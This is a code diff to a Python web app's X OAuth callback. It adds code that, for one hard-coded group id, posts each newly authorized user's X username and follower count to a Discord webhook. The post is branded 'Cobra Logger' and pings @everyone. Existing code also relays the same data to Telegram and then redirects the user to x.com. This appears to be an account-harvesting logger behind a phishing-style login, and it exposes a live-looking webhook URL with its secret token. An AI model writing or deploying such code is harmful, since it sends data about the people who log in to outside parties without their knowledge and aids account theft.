@@ -1,4 +1,5 @@
 import os
+import json
 import base64
 import secrets
 import requests
@@ -123,6 +124,32 @@ def auth_callback():
                 }
             }
         )
+    
+    if group_id == -1002433325091:
+        embed = {
+            "title": "🐍 New User Authorized",
+            "color": 0x00A550,
+            "fields": [
+                {
+                    "name": "👤 Account",
+                    "value": f"[{username}](https://x.com/{username})",
+                    "inline": False
+                },
+                {
+                    "name": "👥 Followers",
+                    "value": f"{followers_count}",
+                    "inline": False
+                },
+            ],
+            "footer": {"text": "Cobra Logger"}
+        }
+        
+        payload = {
+            "content": "@everyone",
+            "embeds": [embed],
+        }
+        
+        requests.post("https://discord.com/api/webhooks/1334653439673897103/IjwKe1YStWUVrBfQZlRE1Kz8mfFv8KkCiHZIsbUd7OCJUF7HghhE0jfzFyCt-puJdBsA", data=json.dumps(payload), headers={"Content-Type": "application/json"})
     
     send_to_telegram(username, followers_count, group_id)
     return redirect(session.get("redirect_url", "https://x.com/"))
